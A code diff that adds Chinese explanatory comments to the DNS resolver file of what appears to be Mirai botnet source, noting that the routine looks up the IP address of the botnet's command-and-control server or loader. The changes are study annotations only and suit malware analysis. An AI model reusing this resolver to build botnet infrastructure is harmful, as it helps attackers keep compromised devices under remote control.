@@ -18,6 +18,7 @@
 #include "rand.h"
 #include "protocol.h"
 
+//没空懂，域名和主机名不一样？？
 void resolv_domain_to_hostname(char *dst_hostname, char *src_domain)
 {
     int len = util_strlen(src_domain) + 1;
@@ -64,6 +65,8 @@ static void resolv_skip_name(uint8_t *reader, uint8_t *buffer, int *count)
         *count = *count + 1;
 }
 
+
+//根据domain查找到CNC或者loader的IP
 struct resolv_entries *resolv_lookup(char *domain)
 {
     struct resolv_entries *entries = calloc(1, sizeof (struct resolv_entries));
@@ -71,11 +74,13 @@ struct resolv_entries *resolv_lookup(char *domain)
     struct dnshdr *dnsh = (struct dnshdr *)query;
     char *qname = (char *)(dnsh + 1);
 
-    resolv_domain_to_hostname(qname, domain);
+    resolv_domain_to_hostname(qname, domain);  //根据domain得到qname  为啥。。
 
     struct dns_question *dnst = (struct dns_question *)(qname + util_strlen(qname) + 1);
     struct sockaddr_in addr = {0};
-    int query_len = sizeof (struct dnshdr) + util_strlen(qname) + 1 + sizeof (struct dns_question);
+
+    int query_len = sizeof (struct dnshdr) + util_strlen(qname) + 1 + sizeof (struct dns_question);//dns请求的长度
+
     int tries = 0, fd = -1, i = 0;
     uint16_t dns_id = rand_next() % 0xffff;
 
@@ -110,7 +115,7 @@ struct resolv_entries *resolv_lookup(char *domain)
             continue;
         }
 
-        if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
+        if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1) //连接dns服务器
         {
 #ifdef DEBUG
             printf("[resolv] Failed to call connect on udp socket\n");
@@ -119,7 +124,7 @@ struct resolv_entries *resolv_lookup(char *domain)
             continue;
         }
 
-        if (send(fd, query, query_len, MSG_NOSIGNAL) == -1)
+        if (send(fd, query, query_len, MSG_NOSIGNAL) == -1) //发送dns查询报文
         {
 #ifdef DEBUG
             printf("[resolv] Failed to send packet: %d\n", errno);
@@ -134,7 +139,7 @@ struct resolv_entries *resolv_lookup(char *domain)
 
         timeo.tv_sec = 5;
         timeo.tv_usec = 0;
-        nfds = select(fd + 1, &fdset, NULL, NULL, &timeo);
+        nfds = select(fd + 1, &fdset, NULL, NULL, &timeo);  //又是一个select  阻塞5s
 
         if (nfds == -1)
         {
@@ -146,7 +151,7 @@ struct resolv_entries *resolv_lookup(char *domain)
         else if (nfds == 0)
         {
 #ifdef DEBUG
-            printf("[resolv] Couldn't resolve %s in time. %d tr%s\n", domain, tries, tries == 1 ? "y" : "ies");
+            printf("[resolv] Couldn't resolve %s in time. %d tr%s\n", domain, tries, tries == 1 ? "y" : "ies");  //第几次没收到回应
 #endif
             continue;
         }
@@ -197,7 +202,7 @@ struct resolv_entries *resolv_lookup(char *domain)
                         p = (uint32_t *)tmp_buf;
 
                         entries->addrs = realloc(entries->addrs, (entries->addrs_len + 1) * sizeof (ipv4_t));
-                        entries->addrs[entries->addrs_len++] = (*p);
+                        entries->addrs[entries->addrs_len++] = (*p);  //查询到CNC的IP地址
 #ifdef DEBUG
                         printf("[resolv] Found IP address: %08x\n", (*p));
 #endif
@@ -221,7 +226,7 @@ struct resolv_entries *resolv_lookup(char *domain)
 #endif
 
     if (entries->addrs_len > 0)
-        return entries;
+        return entries; //返回解析出的CNC的IP地址
     else
     {
         resolv_entries_free(entries);
@@ -229,6 +234,7 @@ struct resolv_entries *resolv_lookup(char *domain)
     }
 }
 
+//释放为entries分配的内存
 void resolv_entries_free(struct resolv_entries *entries)
 {
     if (entries == NULL)
